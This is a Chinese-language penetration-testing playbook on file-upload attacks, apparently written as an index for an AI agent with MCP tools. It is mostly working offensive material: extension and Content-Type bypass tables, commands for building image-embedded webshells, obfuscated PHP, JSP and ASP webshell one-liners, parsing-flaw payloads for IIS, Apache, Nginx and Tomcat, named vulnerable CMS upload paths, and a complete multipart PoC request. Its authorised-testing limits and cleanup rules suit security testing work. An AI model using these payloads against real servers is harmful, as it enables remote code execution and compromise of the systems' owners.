# 文件上传(任意写入 / Webshell)— 决策索引

> 视角:用户能不能让服务器写下他控制的字节。本文件execution-framework + 路由表。**Phase 4 测对应技法时,先读本文件,再 Read 子文件**。

---

## 子文件路由(Phase 4 读哪一份?)

| 入口信号 | MUST Read |
|---|---|
| 普通上传点(form-data file) / 头像 / 图片 / 文档上传 | `10-upload-bypass.md`(扩展名 / MIME / 空字节 / Content-Type 全套) |
| 上传 `.zip`/`.tar`/压缩包 → 服务端解压 / `tar` 命令 | `11-archive-traversal.md`(Zip Slip / 解压路径穿越) |
| 上传后有 "校验 → 移动" / "扫描 → 删除" 流程 / 上传同时直出预览 URL | `12-race-download.md`(竞态 + 任意下载) |
| 上传后报错含Java包名(commons.fileupload/ServletFileUpload/MultipartFile)/ JSP免杀变体 | `10-upload-bypass.md` §D |
| 直接拼到 webshell:见 `../rce/13-file-rce-chain.md`(上传 + 解析配合) |

---


> 视角：黑盒，目标是上传可解析的文件 / 触发解析漏洞 / 拿 shell

## 1. 一句话说清

文件上传 = 把不可信的字节存到服务器 + 后端能解析它。
两层都得突破：(a) **绕过校验**，(b) **触发解析**。
渗透价值：成功 = 直接 RCE，P0；失败 = 受限上传，P2/P3。

---

## 2. 高频入口点

### 2.1 上传点分布（前 50 案例统计）

| 类型 | 占比 | 路径特征 |
|------|------|---------|
| 富文本编辑器 | 42% | `/fckeditor/`、`/ewebeditor/`、`/ueditor/`、`/kindeditor/` |
| 头像 | 18% | `/upload/avatar/`、`/member/uploadfile/` |
| 附件 / 文档 | 15% | `/uploads/`、`/attachment/` |
| 后台功能 | 12% | `/admin/upload/`、`/system/upload/` |
| 业务 | 8% | `/apply/`、`/submit/`、`/import/` |
| 导入 | 5% | `/import/`、`/excelUpload/` |

### 2.2 编辑器路径速查

| 编辑器 | 测试路径 |
|--------|---------|
| FCKeditor | `/FCKeditor/editor/filemanager/browser/default/connectors/test.html` |
| FCKeditor | `/FCKeditor/editor/filemanager/browser/default/browser.html` |
| FCKeditor | `/FCKeditor/editor/filemanager/connectors/jsp/connector?Command=GetFoldersAndFiles&Type=&CurrentFolder=/` |
| eWebEditor | `/ewebeditor/admin/default.jsp` |
| eWebEditor | `/eWebEditor/admin/Login.aspx` |
| UEditor | `/ueditor/controller.jsp?action=config` |
| UEditor | `/ueditor/php/controller.php?action=config` |
| KindEditor | `/kindeditor/php/file_manager_json.php` |
| CKEditor | `/ckfinder/userfiles/files/` |
| TinyMCE | `/plugins/imagemanager/upload.php` |

### 2.3 高危 CMS 路径

| CMS / 系统 | 上传路径 | 条件 |
|-----------|---------|------|
| 万户 OA ezOffice | `/defaultroot/dragpage/upload.jsp` | 截断绕过 |
| 用友协作 | `/oaerp/ui/sync/excelUpload.jsp` | 绕过 JS |
| 金蝶 GSiS | `/kdgs/core/upload/upload.jsp` | 注册用户 |
| Finecms | `/member/controllers/Account.php` | 注册用户 + 竞态 |
| PHPEMS | `/app/document/api.php` | 无后缀检测 |

---

## 3. 探测手法

### 3.1 客户端 JS 校验绕过

```
1. 禁用浏览器 JS / 用 Postman / curl 直接发包
2. Burp 拦截上传请求，改 filename / content-type
3. 改前端 DOM：把 accept="image/*" 删掉
```

### 3.2 扩展名绕过快表

| 技巧 | PHP | ASP/X | JSP |
|------|-----|-------|-----|
| 大小写 | `.Php`、`.pHp` | `.Asp`、`.aSp` | `.Jsp` |
| 双写 | `.pphphp` | `.asaspp` | `.jsjspp` |
| 特殊后缀 | `.php3`、`.php5`、`.phtml`、`.phar`、`.pht` | `.asa`、`.cer`、`.cdx`、`.aspx` | `.jspx`、`.jspa`、`.jspi`、`.jsw` |
| 空格 / 点 | `.php ` 或 `.php.` | `.asp ` | `.jsp.` |
| `::$DATA` | - | `.asp::$DATA` | - |
| `%00` 截断 | `.php%00.jpg` | `.asp%00.jpg` | `.jsp%00.jpg` |
| `;` 截断 | - | `.asp;.jpg`（IIS6） | - |
| `/` 截断 | - | `.asp/.jpg` | - |

### 3.3 Content-Type 修改

```
原始: application/octet-stream
改成: image/jpeg / image/png / image/gif / application/pdf
```

抓包改 `multipart/form-data` 中的 `Content-Type:` 行。

### 3.4 文件头 / 内容绕过

```bash
# 图片马（GIF）
echo -ne "GIF89a\n<?php @eval(\$_POST['c']);?>" > shell.gif
mv shell.gif shell.php

# 图片马（PNG，二进制头 + 注释段藏 PHP）
copy /b real.png + shell.php fake.png   # Windows
cat real.jpg shell.php > fake.jpg        # Linux

# EXIF 注入（GIMP 编辑 EXIF Comment）
exiftool -Comment="<?php system(\$_GET['cmd']);?>" image.jpg
```

### 3.5 Webshell 内容免杀

| 类型 | 示例 |
|------|------|
| **PHP 变量函数** | `<?php $a='ass'.'ert'; $a($_POST['c']);?>` |
| **PHP 回调** | `<?php array_map('assert', $_POST);?>` |
| **PHP 动态构造** | `<?php $f = create_function('', $_POST['x']); $f();?>` |
| **PHP eval 替代** | `preg_replace('/.*/e', $_POST['c'], '');`（PHP < 7） |
| **JSP** | `<%Runtime.getRuntime().exec(request.getParameter("c"));%>` |
| **JSPX** | XML 格式，WAF 检测 `.jsp` 时漏掉 |
| **ASP** | `<%execute(request("c"))%>` |
| **ASPX** | `<%@ Page Language="C#"%><%System.Diagnostics.Process.Start(...)%>` |

### 3.6 解析漏洞触发

| 服务器 | 漏洞 | Payload |
|--------|------|---------|
| **IIS 6.0 目录** | `/shell.asp/1.jpg` → 当 ASP | 上传到 `/shell.asp/` 文件夹 |
| **IIS 6.0 文件** | `shell.asp;.jpg` → 当 ASP | 直接命名 |
| **IIS 7.x** | `shell.jpg/.php` → 当 PHP（fix_pathinfo=1） | URL 拼接 |
| **Apache 多后缀** | `shell.php.xxx` → 当 PHP（从右向左找） | 命名为 `shell.php.xxx` |
| **Apache .htaccess** | `AddType application/x-httpd-php .jpg` | 上传 .htaccess 后再传 .jpg |
| **Apache CVE-2017-15715** | `shell.php\x0a` → 当 PHP | 文件名末加 `\n` |
| **Nginx fix_pathinfo** | `shell.jpg/x.php` → 当 PHP | URL 路径拼接 |
| **Nginx CVE-2013-4547** | `shell.jpg \0.php` | 空字节 |
| **Tomcat CVE-2017-12615** | PUT `/shell.jsp/` | PUT 方法 |

### 3.7 路径获取 / 命名规则

| 方式 | 描述 |
|------|------|
| 响应直接返回 | `{"url":"/uploads/2024/abc.jpg"}` |
| 预览功能 | 上传后页面显示 / 编辑器预览 |
| 编辑器目录遍历 | `?Command=GetFoldersAndFiles&CurrentFolder=/../` |
| 时间戳爆破 | `20140829221136jsp.jsp`，秒级偏差 ±60s |
| 配合 .git 泄露 | 反推命名规则代码 |

---

## 4. Bypass 矩阵

| 防护 | 绕过 |
|------|------|
| 客户端 JS | 禁 JS / 抓包改包 |
| 黑名单后缀 | 大小写、双写、特殊后缀 |
| 白名单 | `%00`（旧）、解析漏洞、`.jsp/x.jsp.png` |
| Content-Type | 改 `image/jpeg` |
| 文件头 | `GIF89a` 头 + 脚本 |
| 内容静态扫描 | 变量函数 / 编码 / 拼接 |
| 大小限制 | Chunked / 分片上传 |
| 二次渲染 | EXIF / IDAT / GIF 注释段 / PNG tEXt |
| 上传后路径不返回 | 编辑器遍历 / 时间戳爆破 / 配合源码泄露 |
| 删除时间窗 | 竞态：多线程上传 + 立即访问（Finecms 漏洞） |
| 非脚本目录 | `filename=../../webroot/shell.php` 路径穿越 |

---

## 5. 利用提权 / 横向

```
上传 webshell.jsp / shell.php
  → 访问 /uploads/shell.php?c=id
  → 反弹 shell（未授权不要做）
  → 提权（不要做）
  → 横向（不要做）

→ 渗透报告时停在"shell.php?c=id 返回 uid=..."
  写入文件命名为 poc-{date}-{nick}.jsp，立即在报告里说明"已请清理"
```

---

## 6. 真实案例指纹

| 案例 ID | 关键技术 | 目标 |
|--------|---------|------|
| wooyun-2015-0108457 | HTTP Response 修改绕过 | 交通系统 |
| wooyun-2015-0135258 | FCKeditor 编辑器漏洞 | 公共交通 |
| wooyun-2016-0167456 | `%00` 截断 | 金融系统 |
| wooyun-2014-064031 | 万户 OA 截断绕过 | 万户 ezOffice |
| wooyun-2015-090186 | eWebEditor | 政府采购 |
| wooyun-2014-063369 | Finecms 竞争条件 | Finecms |
| wooyun-2015-0126541 | 万户 ezOffice 架构分析 | 万户 |
| wooyun-2015-0149146 | JSPX 绕过 | 保险系统 |
| wooyun-2015-0158311 | Nginx 解析漏洞 | 门户网站 |
| wooyun-2016-0212792 | 扩展名绕过 | 运营商 |

通用指纹：

- 上传响应含 `path`、`url`、`filename` 字段 → 路径已知
- 站点 `/uploads/`、`/upload/`、`/files/` 直接可访问目录列表 → 浏览
- IIS 6.0 + `.asp;.jpg` → 经典解析漏洞
- Apache + 上传 .htaccess 不被禁 → 改解析规则
- Nginx + URL `x.jpg/y.php` 返回 200 → fix_pathinfo

---

## 7. 复现 / 证据要点

### 7.1 报告必备

1. **上传请求包**（含完整 multipart）
2. **上传响应**（含返回的文件 URL，如有）
3. **访问 webshell 的请求 + 响应**（证明可执行）
4. **执行命令的输出**（`id`，脱敏内网信息）
5. **修复后请清理 PoC 文件**的提示

### 7.2 报告 PoC 模板

```http
POST /upload.jsp HTTP/1.1
Host: target.com
Content-Type: multipart/form-data; boundary=xxx

--xxx
Content-Disposition: form-data; name="file"; filename="poc-2025-05-09.jsp"
Content-Type: image/jpeg

<%out.println(Runtime.getRuntime().exec("id").getInputStream());%>
--xxx--

# 响应
{"url":"/uploads/20250509142312poc-2025-05-09.jsp"}

# 验证
GET /uploads/20250509142312poc-2025-05-09.jsp
→ uid=1001(tomcat) gid=1001(tomcat)
```

### 7.3 CVSS

```
未授权任意文件上传 → RCE  CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H = 9.8
认证后任意文件上传 → RCE  CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H = 8.8
受限上传（仅前缀绕过） CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N = 6.5
```

### 7.4 影响段

```
通过 /upload.jsp 接口，攻击者可绕过扩展名校验上传 .jsp 文件，
配合 Tomcat 默认解析行为获得 RCE。攻击者可：
1. 读取 web 应用源码、数据库连接配置；
2. 横向至内网（应用服务器通常可访问 DB / Redis）；
3. 在不修复情况下持久化驻留。

测试时上传文件名 poc-2025-05-09.jsp，命令仅执行 id，
请贵方在确认漏洞后删除 /uploads/20250509142312poc-2025-05-09.jsp。
```

---

## 相关 MCP 工具

实战中可调用 jshookmcp 完成自动化。**默认 `search` profile 未预加载工具,调用前先用 `mcp__jshook__activate_tools <工具名>` 激活**(详见 [`../../tools/mcp-jshook.md`](../../tools/mcp-jshook.md) §推荐 profile)。

| 工具 | 域 | 调用时机 |
|---|---|---|
| `mcp__jshook__binary_encode` + `mcp__jshook__binary_decode` | encoding | 构造 polyglot(图片头+脚本尾)/ base64 / hex 转换 |
| `mcp__jshook__ast_transform_apply` + `mcp__jshook__ast_transform_preview` | transform | 修改 magic byte / 改 polyglot 结构 / 改 MIME 嵌入语义 |
| `mcp__jshook__http_plain_request` | network | 自定义 multipart 边界 / 改 Content-Disposition 头绕过过滤 |
| `mcp__jshook__network_replay_request` | network | 重放上传请求并改 filename / Content-Type |
| `mcp__jshook__protobuf_decode_raw` | encoding | 上传响应是 protobuf 时盲解元数据 |

完整映射:[`../../tools/mcp-jshook.md`](../../tools/mcp-jshook.md)

## 8. 不要做的事

- **禁**：上传真正的 webshell（带后门、加密通道）。**只用最简单的 jsp/php**：`<%=Runtime.getRuntime().exec("id").getInputStream()%>`。
- **禁**：上传后做提权、横向、植入持久化。
- **禁**：上传可被他人误访问的内容（钓鱼页、外链脚本）。
- **禁**：留下 webshell 不清理。报告里**主动**告知文件路径并请求删除。
- **禁**：测试覆盖现有合法文件（如 `index.jsp`）——可能影响业务。
- **限**：测试上传 1–3 个 PoC 文件即停，不批量上传。
- **报告中**：写明"PoC 文件名为 X，请贵方修复后删除"。

## H1 真实案例

_共 8 份 HackerOne 已披露 High/Critical 报告命中本类，按 (赏金 + 投票×100) 排序取 Top 12_

| Severity | $ | 程序 | 标题（点击看原报告） | 摘要 |
|---|--:|---|---|---|
| High | 1500 usd | Slack | [Tricking the "Create snippet" feature into displaying the wrong filetype can lead to RCE on Slack…](https://hackerone.com/reports/833080) | Tricking the "Create snippet" feature into displaying the wrong filetype can lead to RCE on Slack users |
| Critical | 5000 usd | Aiven Ltd | [[Kafka Connect] [JdbcSinkConnector][HttpSinkConnector] RCE by leveraging file upload via SQLite J…](https://hackerone.com/reports/1547877) | Summary: The Aiven JDBC sink includes the SQLite JDBC Driver. This JDBC driver can be used to upload SQLite database files onto… |
| Critical | — | Mars | [Unrestricted File Upload at ██████████](https://hackerone.com/reports/2357778) | Unrestricted File Upload at ██████████ |
| High | 4660 usd | Internet Bug Bounty | [Cargo not respecting umask when extracting crate archives](https://hackerone.com/reports/2094785) | Cargo did not properly protect files in the cargo registry. When an archive contained files which were marked as globally write… |
| High | — | U.S. Dept Of Defense | [Unrestricted File Upload Leads to XSS & Potential RCE](https://hackerone.com/reports/900179) | Summary:** Unrestricted file upload at████████/request?openform. When the user wants to upload a file the app allows the user t… |
| High | — | WordPress | [[Buddypress] Arbitrary File Deletion through bp_avatar_set](https://hackerone.com/reports/183568) | Hi, The bp_avatar_set action in BuddyPress when cropping avatars allows an attacker to arbitrarily delete a file the webserver … |
| High | — | Node.js third-party modules | [Arbitrary File Write Through Archive Extraction](https://hackerone.com/reports/362118) | I would like to report arbitrary file write vulnerability in adm-zip module It allows attackers to write arbitrary files when a… |
| High | — | U.S. Dept Of Defense | [Stored XSS on ████████helpdesk](https://hackerone.com/reports/901799) | Stored XSS on ████████helpdesk |

**命中本类的 weakness 分布：**

- Unrestricted Upload of File with Dangerous Type：5 条
- Uncategorized → 手工归类：3 条



---

完整 Payload 库见同级子文件。
